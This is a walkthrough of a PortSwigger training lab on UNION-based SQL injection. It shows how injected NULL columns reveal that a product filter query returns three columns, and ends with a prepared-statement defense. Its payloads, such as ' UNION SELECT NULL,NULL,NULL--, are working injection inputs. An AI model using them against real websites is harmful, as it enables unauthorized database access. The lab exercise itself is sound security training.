# 📘 PortSwigger Lab: SQL injection UNION attack, determining the number of columns returned by the query

<a id="top"></a>

> 🔗 Lab: https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns

---

# 📑 Table of Contents

- [🎯 Goal](#goal)
- [🧠 UNION attack idea](#idea)
- [🏗 How UNION works](#how)
- [🔍 Step 1 — Find SQL Injection](#step1)
- [🔍 Step 2 — Test UNION](#step2)
- [🔍 Step 3 — Determine column count](#step3)
- [🔍 Step 4 — Successful payload](#step4)
- [💥 Why the attack worked](#why)
- [🛡 Defense](#defense)
- [🛠 Checklist](#checklist)

---

<a id="goal"></a>

# 🎯 Goal

Determine the number of columns returned by the original SELECT query using UNION SQL Injection.

---

<a id="idea"></a>

# 🧠 UNION attack idea

`UNION` combines results from multiple SELECT queries.

Example:

```sql
SELECT name,price FROM products
UNION
SELECT username,password FROM users
```

Main rule:

```sql
SELECT a,b
UNION
SELECT c,d
```

✅ Column count matches.

---

<a id="how"></a>

# 🏗 How UNION works

Backend likely builds:

```sql
SELECT name,description,price FROM products WHERE category='Accessories'
```

We do not know:
- how many columns exist;
- which datatypes are used.

So first we determine the column count.

---

<a id="step1"></a>

# 🔍 Step 1 — Find SQL Injection

Test:

```http
/filter?category=Accessories'
```

If the response changes,
SQL Injection exists.

---

<a id="step2"></a>

# 🔍 Step 2 — Test UNION

Try:

```http
/filter?category=Accessories' UNION SELECT NULL--
```

`NULL` is used because it works with almost every datatype.

---

<a id="step3"></a>

# 🔍 Step 3 — Determine column count

Increase NULL values step by step:

```sql
UNION SELECT NULL--
```

```sql
UNION SELECT NULL,NULL--
```

```sql
UNION SELECT NULL,NULL,NULL--
```

---

# What we are looking for

The moment when:
- errors disappear;
- the response becomes normal;
- the server returns `200 OK`.

---

# What happened in the lab

```sql
UNION SELECT NULL--
```

❌ Error

```sql
UNION SELECT NULL,NULL--
```

❌ Error

```sql
UNION SELECT NULL,NULL,NULL--
```

✅ Success

```http
HTTP/2 200 OK
```

---

# Conclusion

The original SELECT query has:
# 3 columns

---

<a id="step4"></a>

# 🔍 Step 4 — Successful payload

Final payload:

```http
/filter?category=Accessories' UNION SELECT NULL,NULL,NULL--
```

SQL becomes:

```sql
SELECT name,description,price FROM products
WHERE category='Accessories'
UNION SELECT NULL,NULL,NULL--'
```

---

# Additional test

We can test string-compatible columns:

```http
/filter?category=Accessories' UNION SELECT NULL,'a',NULL--
```

---

# What this showed

The second column accepts string values.

---

<a id="why"></a>

# 💥 Why the attack worked

Because the application:
- inserted user input directly into SQL;
- did not use prepared statements;
- allowed modification of the SELECT query.

---

<a id="defense"></a>

# 🛡 Defense

- Prepared Statements
- Parameterized Queries
- Input Validation
- Least Privilege
- WAF

Safe example:

```php
$stmt = $pdo->prepare("SELECT * FROM products WHERE category=?");
```

---

<a id="checklist"></a>

# 🛠 Checklist

- [ ] SQL Injection identified
- [ ] UNION SELECT tested
- [ ] column count determined
- [ ] valid payload found
- [ ] string-compatible column identified

---

# ⬆ Back to top

[Return to top](#top)
